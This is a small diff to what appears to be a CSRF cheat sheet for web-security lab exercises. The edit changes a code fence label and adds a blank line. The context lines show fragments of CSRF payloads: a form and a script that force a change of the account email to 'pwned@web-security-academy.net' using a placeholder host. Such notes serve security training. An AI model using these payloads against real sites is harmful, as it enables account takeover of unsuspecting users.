@@ -43,7 +43,7 @@
 
 #### Cheat Sheet
 
-```js
+```html
 
 // CSRF NO DEFENSES  / TRY WITH GET INSTEAD POST
 <form class="login-form" name="change-email-form" action="<IP>/my-account/change-email" method="POST">
@@ -102,4 +102,5 @@ Referrer-Policy: unsafe-url (http header)
     document.location = "<IP>/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
 </script>
 ```
+
 
